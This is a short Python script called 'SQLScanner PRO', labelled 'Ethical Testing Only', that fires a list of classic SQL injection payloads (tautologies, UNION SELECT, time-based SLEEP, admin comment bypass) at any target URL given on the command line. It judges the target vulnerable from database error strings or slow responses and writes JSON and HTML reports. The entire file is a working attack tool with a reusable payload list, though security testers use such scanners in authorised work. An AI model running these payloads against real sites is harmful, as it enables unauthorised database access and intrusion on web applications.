﻿import requests,time,threading,argparse,json,re
from urllib.parse import urlparse,parse_qs,urljoin
from concurrent.futures import ThreadPoolExecutor

print("======================================")
print(" SQLScanner PRO")
print(" Author: Chandana")
print(" Ethical Testing Only")
print("======================================")

parser=argparse.ArgumentParser()
parser.add_argument("-u","--url",required=True,help="Target URL")
parser.add_argument("-t","--threads",type=int,default=10,help="Threads")
args=parser.parse_args()

target=args.url
threads=args.threads

payloads=[
"' OR '1'='1",
"' OR 1=1--",
"' UNION SELECT NULL--",
"' AND SLEEP(5)--",
"admin' --",
"' OR 'a'='a"
]

sql_errors=[
"sql syntax",
"mysql",
"warning",
"odbc",
"postgresql",
"oracle",
"syntax error"
]

results=[]
lock=threading.Lock()

def scan(payload):
    try:
        url=target+payload
        start=time.time()
        r=requests.get(url,timeout=10)
        end=time.time()

        vulnerable=False
        reason=""

        for e in sql_errors:
            if e in r.text.lower():
                vulnerable=True
                reason="Error-Based"
                break

        if end-start>4:
            vulnerable=True
            reason="Time-Based"

        if vulnerable:
            print("[+] Vulnerable:",payload,"(",reason,")")
            lock.acquire()
            results.append({
                "payload":payload,
                "url":url,
                "type":reason
            })
            lock.release()
        else:
            print("[-] Safe:",payload)

    except:
        print("Request Failed")

    time.sleep(1)

print("Starting Scan with",threads,"threads")

with ThreadPoolExecutor(max_workers=threads) as executor:
    executor.map(scan,payloads)

with open("report.json","w") as f:
    json.dump(results,f,indent=4)

html="<html><body><h1>SQLScanner Report</h1><ul>"
for r in results:
    html+="<li>"+r["url"]+" ("+r["type"]+")</li>"
html+="</ul></body></html>"

open("report.html","w").write(html)

print("Scan Complete")
print("JSON report -> report.json")
print("HTML report -> report.html")

